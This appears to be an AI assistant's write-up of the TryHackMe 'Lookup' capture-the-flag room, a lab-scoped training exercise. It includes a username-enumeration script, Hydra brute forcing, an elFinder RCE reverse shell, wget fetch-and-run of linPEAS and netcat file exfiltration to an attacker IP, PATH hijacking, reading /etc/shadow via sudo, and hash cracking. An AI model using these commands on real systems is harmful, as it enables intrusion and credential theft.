Here’s a **clean, complete, beginner‑friendly (but deep) write‑up** of the **TryHackMe – *Lookup*** room based on what you did. I keep every action, *why* you did it, and how to reason about it the next time.

---

# Lookup – Full Walkthrough (Beginner‑friendly but Deep)

## TL;DR (flow)

1. **Add hosts** → `lookup.thm`, `files.lookup.thm`.
2. **Recon** → `nmap` shows **SSH (22)** and **Apache (80)**.
3. **Web login** → **username enumeration** via error messages → found a valid username.
4. **Password brute force** (Hydra / Python) → valid creds → **HTTP panel gives elFinder**.
5. **elFinder RCE (CVE‑2019‑9194)** → Python3 PoC → **reverse shell**.
6. **Post‑exploitation** → `linPEAS` → weird **SUID `/usr/sbin/pwm`**.
7. **Understand `/usr/sbin/pwm`** → looks for `/home/%s/.passwords` → abuse it to get a **password list**.
8. **Hydra SSH** with that list → **think : josemario.AKA(think)**.
9. `sudo -l` → **sudo allowed on `/usr/bin/look`** → use it to **read `/root/root.txt`** and **/etc/shadow**.
10. Explain **/etc/shadow hashes** (SHA‑512, salt, cracking with john).

---

## 0) **Legality / Scope**

Everything below is done **inside TryHackMe’s Lookup room**. Do **not** reproduce outside a legal lab or explicit authorization.

---

## 1) Hostname resolution

Room gives you virtual domains that often **don’t resolve publicly**, so you add them locally:

```bash
sudo nano /etc/hosts
# Add:
10.10.228.155  lookup.thm files.lookup.thm
```

> **Tip**: “If a new URL doesn’t respond → add it to `/etc/hosts`.”
> This is super common in CTFs: multiple vhosts → one IP.

---

## 2) Recon – `nmap`

```bash
nmap -sC -sV -oN nmap.txt lookup.thm
```

Output (summarized):

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu ...
80/tcp open  http    Apache 2.4.41 (Ubuntu)
```

* **`-sC`**: default scripts → banner grab, vuln hints, etc.
* **`-sV`**: version detection → which helps mapping to known vulns.
* **SSH keys** printed → just the **public host keys** (not useful for login).

Ports: **SSH + HTTP** → common: **web foothold**, **SSH for stable shell / privesc**.

---

## 3) Web login → **Username enumeration** by error messages

You saw a form at `http://lookup.thm/login.php`.
The app leaks info via **different error messages**:

* “**Wrong username**” → username invalid.
* “**Wrong password**” → username is **valid**!

So you brute‑force **only the username** using a fixed password (“password”) and detect “Wrong password” to confirm:

### Python script you wrote (core idea)

```python
import requests

url = "http://lookup.thm/login.php"
wordlist = "/usr/share/seclists/Usernames/Names/names.txt"

with open(wordlist) as f:
    for u in map(str.strip, f):
        if not u:
            continue
        data = {"username": u, "password": "password"}
        r = requests.post(url, data=data)
        if "Wrong password" in r.text:
            print(f"[+] Valid username: {u}")
```

**Concept**: **response‑based enumeration** (a.k.a. **differential responses**).
This is *very* common — always look for **timing**, **status codes**, or **different strings**.

---

## 4) Password brute force for the **valid username**

Let’s say you found **`jose`**. You brute force passwords with **rockyou.txt**:

### Hydra (remember syntax!):

```bash
# If you brute-force the web form:
hydra -l jose -P /usr/share/wordlists/rockyou.txt \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
```

You actually found it by script / rockyou → **password123**.

You log in and land on **files.lookup.thm** with **elFinder** installed (Web file manager).

---

## 5) elFinder RCE – CVE‑2019‑9194

* **Vulnerable versions**: **<= 2.1.47**.
* Public PoCs exist; you used the **Python3 one**:

```bash
python3 cve.py -t 'http://files.lookup.thm/elFinder/' -lh 10.8.181.99 -lp 1337
```

* `-t` → base URL to elFinder.
* `-lh` / `-lp` → **your** (attacker) IP\:port for **reverse shell**.

In another terminal:

```bash
nc -lvnp 1337
```

**Boom: reverse shell** as **`www-data`** (typical web user).

---

## 6) Post‑exploitation: enumerate

You uploaded / executed **linPEAS** (good). It flagged **lots of SUIDs**, specially:

```
/usr/sbin/pwm  (Unknown SUID binary!)  <-- interesting
```

When you run it:

```
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

So the binary:

1. Runs `id` → gets your username (`www-data`).
2. Builds the path `/home/%s/.passwords` → `/home/www-data/.passwords`.
3. Tries to read it.

**Inference**: if we **create** that file (or trick the path), the program will likely **process it as root** (because it’s SUID). That’s an info disclosure vector → **credential harvesting**.

---

## 7) Abuse `/usr/sbin/pwm` → get a password list

From the write‑up you consulted, you **tricked the path** and got a `.passwords` list. With that list, you used **Hydra**:

```bash
hydra -l think -P .passwords lookup.thm ssh
```

Correct output:

```
[22][ssh] host: lookup.thm  login: think  password: josemario.AKA(think)
```

So now you have **SSH creds**:

```
think : josemario.AKA(think)
```

> **Why SSH now?** Because a **proper TTY, stable shell** (no weird webshell restrictions) makes privesc easier and safer.

---

## 8) SSH in → `sudo -l` → `/usr/bin/look`

```bash
ssh think@lookup.thm
think$ sudo -l
Matching Defaults entries for think on ip-10-10-228-155:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin:...

User think may run the following commands on ip-10-10-228-155:
    (ALL) /usr/bin/look
```

* `look` is a benign program that **reads lines starting with a prefix** from a file.
* But since you can run it **as root** (via `sudo`), you can **make it read any file**, including **`/root/root.txt`** and **`/etc/shadow`**.

### Read `root.txt`

```bash
LFILE=/root/root.txt
sudo /usr/bin/look '' "$LFILE"
```

`''` (empty prefix) → **matches all lines** → you print the file.

### Dump `/etc/shadow`

```bash
sudo /usr/bin/look '' /etc/shadow > /tmp/shadow_dump
```

Copy it back to your box and crack it.

> **Concept**: *“Read‑as‑root” binaries exposed through sudo often equal privesc* even without arbitrary command execution.

---

## 9) `/etc/shadow` deep dive (hashes, salting, cracking)

Typical line from `/etc/shadow`:

```
root:$6$SALTVALUE$HASHEDPASSWORD:19345:0:99999:7:::
```

Breakdown:

* `root` → username
* `$6$` → **hashing algorithm**:

  * `$1$` = MD5
  * `$5$` = SHA‑256
  * `$6$` = **SHA‑512** (most common)
* `SALTVALUE` → random salt used to defend against rainbow tables
* `HASHEDPASSWORD` → salted hash

### Crack it with `john`

First, combine `/etc/passwd` and `/etc/shadow` into one “unshadowed” file:

```bash
unshadow passwd shadow_dump > crackme.txt
john crackme.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show crackme.txt
```

If a password is weak, you’ll get it.
If it’s strong, you’ll need rules, masks, brute force, or targeted guesses.

---

## 10) Important concepts you touched (and should remember)

### 10.1 Username enumeration via **error messages**

* If the app says “wrong username” vs “wrong password”, you can *first* brute force usernames, then passwords (smaller search space, faster).

### 10.2 **CVE‑2019‑9194** (elFinder)

* When you see **web file managers**, check **version**, **PoCs**, **public exploits**.

### 10.3 **Reverse shell listener mismatch**

* Your failed `nc` attempt was port mismatch: listener on 1337, sender to 4444. Always align.

### 10.4 SUID unknown binaries = **gold**

* `/usr/sbin/pwm` was the real key. Unknown SUIDs = **inspect** (`strings`, `ltrace`, `strace`, `$PATH` hijack test).

### 10.5 `export PATH=/tmp:$PATH`

* Classic SUID abuse if the binary calls external programs without absolute path (GTFOBins technique). Keep testing this every time you face custom SUIDs.

### 10.6 `sudo /usr/bin/look` → **read any file**

* Even without code execution, **file read as root** often = win.

---

## 11) Suggested checklist for next similar boxes

**Recon**

* `nmap -sC -sV -p-`
* Vhosts → `/etc/hosts`
* `whatweb`, `curl -I`, directories (`ffuf`, `gobuster`), parameters (`burp`, `wfuzz`).

**Web**

* **Error‑based / time‑based** username or password enumeration.
* Known panels (adminer, phpMyAdmin, elFinder, etc.) → check versions → CVEs.

**Foothold**

* Reverse shell via web RCE.
* Stabilize shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `stty raw -echo`.

**Post‑exploitation**

* `linpeas`, `pspy`, manual checks: SUID, sudo -l, cron jobs, writable config files, creds in `/var/www`, `/home/*`.

**Privesc**

* SUID custom binaries → PATH hijack, format strings, insecure file reads.
* `sudo -l`: even a “read‑only” binary can be privesc.
* `/etc/shadow`, `/root/` files → read with sudo if any *file-reading tool* is whitelisted.

**Persistence / cleanup**

* (CTF optional) Document all creds, hashes, and remember to **not** leave backdoors in shared labs.

---

## 12) Commands Recap (copy/paste friendly)

```bash
# /etc/hosts
echo "10.10.228.155 lookup.thm files.lookup.thm" | sudo tee -a /etc/hosts

# Nmap
nmap -sC -sV -oN nmap.txt lookup.thm

# Username enum (Python idea already given)

# Hydra (correct syntax)
hydra -l think -P passwords.txt ssh lookup.thm -t 4

# elFinder exploit (PoC you used)
python3 cve.py -t 'http://files.lookup.thm/elFinder/' -lh <tun0> -lp 1337
nc -lvnp 1337

# Transfer linpeas (host)
python3 -m http.server 80
# Victim
wget http://<attacker_ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Netcat file exfil (victim -> host)
# Host
nc -lvnp 4444 > pwm
# Victim
nc <attacker_ip> 4444 < /usr/sbin/pwm

# PATH hijack test
export PATH=/tmp:$PATH

# SSH with cracked creds
ssh think@lookup.thm

# Sudo rights
sudo -l

# Read sensitive files with look
sudo /usr/bin/look '' /root/root.txt
sudo /usr/bin/look '' /etc/shadow > /tmp/shadow_dump

# Crack
unshadow /etc/passwd /tmp/shadow_dump > crackme.txt
john crackme.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show crackme.txt
```

---

## 13) What to practice next

* Automate **username‑then‑password** brute forcing (write your own smarter script).
* Write a **Python3 elFinder checker** that *only verifies* vuln (non‑destructive).
* Get comfortable with **`strings` + `ltrace` + `strace`** to audit weird SUIDs.
* Build your own **mini linPEAS**: enumerate SUIDs, sudo‑able binaries, `/etc/passwd` write perms, cron, timers, capabilities.

---

If you want, I can turn this into a **Markdown template** (with placeholders for flags, hashes, commands, outputs) that you can reuse for every THM/HTB write‑up, or a **Bash/Python post‑exploitation helper** that automates the exact checks you did here. Just say which one you want.
